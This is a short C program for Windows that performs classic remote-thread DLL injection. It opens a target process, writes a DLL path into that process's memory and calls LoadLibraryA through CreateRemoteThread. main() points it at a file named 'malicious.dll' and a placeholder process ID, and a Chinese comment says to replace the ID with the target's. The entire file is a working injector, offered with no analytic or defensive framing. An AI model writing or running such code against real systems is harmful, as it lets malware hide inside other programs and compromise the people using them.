#include <windows.h>
#include <tlhelp32.h>
#include <tchar.h>

void InjectDLL(DWORD processID, const char* dllPath) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);
    if (hProcess == NULL) {
        _tprintf(TEXT("OpenProcess failed. GetLastError = %d\n"), GetLastError());
        return;
    }

    LPVOID pRemoteMemory = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
    if (pRemoteMemory == NULL) {
        _tprintf(TEXT("VirtualAllocEx failed. GetLastError = %d\n"), GetLastError());
        CloseHandle(hProcess);
        return;
    }

    if (!WriteProcessMemory(hProcess, pRemoteMemory, (LPVOID)dllPath, strlen(dllPath) + 1, NULL)) {
        _tprintf(TEXT("WriteProcessMemory failed. GetLastError = %d\n"), GetLastError());
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return;
    }

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "LoadLibraryA"), pRemoteMemory, 0, NULL);
    if (hThread == NULL) {
        _tprintf(TEXT("CreateRemoteThread failed. GetLastError = %d\n"), GetLastError());
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return;
    }

    WaitForSingleObject(hThread, INFINITE);

    VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);
}

int main() {
    const char* dllPath = "C:\\path\\to\\malicious.dll";
    DWORD processID = 1234;  //替换为目标进程的ID

    InjectDLL(processID, dllPath);

    return 0;
}
